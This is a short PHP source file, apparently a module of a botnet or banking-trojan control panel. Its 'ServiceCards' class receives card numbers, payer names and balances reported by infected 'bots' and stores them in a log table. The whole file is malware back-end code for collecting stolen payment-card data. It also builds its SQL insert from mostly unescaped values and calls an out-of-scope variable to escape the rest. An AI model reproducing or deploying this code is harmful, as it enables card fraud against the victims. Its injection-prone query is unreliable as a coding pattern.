<?php

class ServiceCards {
    private $bot, $system, $mysqli;
    
    function __construct(){
        global $bot, $system, $mysqli;
        $this->bot = &$bot;
        $this->system = &$system;
        $this->db = &$mysqli;
    }
   
    function Save($value){
	if(!empty($value['subsys'])){
	    if(!isset($value['cardnumber']) || empty($value['cardnumber'])){
		$value['cardnumber'] = $value['cardnumber1'] . $value['cardnumber2'] . $value['cardnumber3'] . $value['cardnumber4'];
		unset($value['cardnumber1'], $value['cardnumber2'], $value['cardnumber3'], $value['cardnumber4']);
	    }
	    
	    if(strlen($value['cardnumber']) != 16) return false;
	    
	    if(!isset($value['payername']) || empty($value['payername'])){
		$value['payername'] = $value['payername1'] . $value['payername2'];
		unset($value['payername1'], $value['payername2']);
	    }
	    
	    if(empty($value['payername'])) return false;
	    
	    $subsys = $value['subsys'];
	    unset($value['subsys']);
	    
	    $value = array_map("urldecode", $value);
	    
	    $txt = '';
	    foreach($value as $key => $item){
		$txt .= $key . ': ' . $item . "\r\n";
	    }	    
	    
	    return $this->db->query('INSERT DELAYED INTO bf_log_info (userid, prefix, uid, balance, log, subsys, system) VALUES ( \''.$this->bot->userid.'\', \''.$this->bot->prefix.'\', \''.$this->bot->uid.'\', \''.$value['summ'].'\', \''.$mysqli->real_escape_string($txt).'\', \''.$subsys.'\', \''.$this->system->nid.'\')');
	}else{
	    return false;
	}
    }
}

RegisterService("ServiceCards");